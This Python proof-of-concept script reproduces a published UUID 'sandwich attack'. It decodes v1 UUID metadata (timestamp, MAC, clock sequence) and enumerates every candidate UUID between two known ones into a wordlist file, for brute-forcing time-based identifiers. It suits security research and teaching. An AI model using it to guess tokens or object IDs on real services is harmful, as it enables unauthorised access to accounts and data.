import uuid
import binascii
from datetime import datetime
import os

"""
Python3 script trying to reproduce the "Sandwich Attack: A New Way Of Brute Forcing UUIDs"
described on "https://versprite.com/blog/universally-unique-identifiers/".
"""
# Function to perform HTTP request

NUM_100NS_INTERVALS_SINCE_UUID_EPOCH = 122192928000000000


def extract_uuid_infos(target_uuid):
    infos = None
    try:
        # Verify that the parameter passed in a valid UUID
        uuid_item = uuid.UUID(target_uuid)
        version = uuid_item.version
        infos = f"V{version} - '{target_uuid}' - "
        # Extract infos based on version
        if version == 1:
            epch = (uuid_item.time - NUM_100NS_INTERVALS_SINCE_UUID_EPOCH) / 10000
            dtime = datetime.fromtimestamp(epch / 1000)
            node_part = target_uuid.split("-")[4]
            mac = f"{node_part[0:2]}:{node_part[2:4]}:{node_part[4:6]}:{node_part[6:8]}:{node_part[8:10]}:{node_part[10:]}".upper()
            infos += f"Generation time '{dtime}' - Node MAC Address '{mac}' - ClockID/ClockSequence '{uuid_item.clock_seq}'."
        elif version == 2:
            infos += "Least significant 8 bits of the clock sequence are replaced by a 'local domain' number and least significant 32 bits of the timestamp are replaced by an integer identifier meaningful within the specified local domain."
        elif version == 3:
            infos += "MD5(NAMESPACE_IDENTIFIER + NAME)."
        elif version == 4:
            infos += "UUID could be duplicated (low chances) so manual check needed for entropy potential issues."
        elif version == 5:
            infos += "SHA1(NAMESPACE_IDENTIFIER + NAME)."
        else:
            infos += " Unknown version."
    except Exception:
        infos = None
    return infos


# Version of the POC fixing the "clock_seq" like in the article
# print("==== POC v1: Fixed clock_seq")
item_1 = "ce13f895-f062-11ef-a17d-0242ac140002" # first uuid
item_2 = "ce13f8a9-f062-11ef-a17d-0242ac140002" # second uuid

# Delete the file if it exists
if os.path.exists("uuids.txt"):
    os.remove("uuids.txt")

print(extract_uuid_infos(item_1))
print(extract_uuid_infos(item_2))
start = int(item_1.split("-")[0],16)
end = int(item_2.split("-")[0],16)
base = item_1.split("-") 
start_date = datetime.now()
print(f"Delta: {end-start}")
print(f"Start: {start_date}")
wiw = []
f = open("uuids.txt", "w")
print(start)
print(end)
for i in range(start, end):
    print(i)
    base[0] = hex(i)[2:]
    value = "-".join(base)
    f.writelines(value+"\n")
    wiw.append(value)
print(wiw)
end_date = datetime.now()
print(f"End  : {end_date}")
delay = end_date - start_date
print(f"Delay: {delay.total_seconds()} seconds")
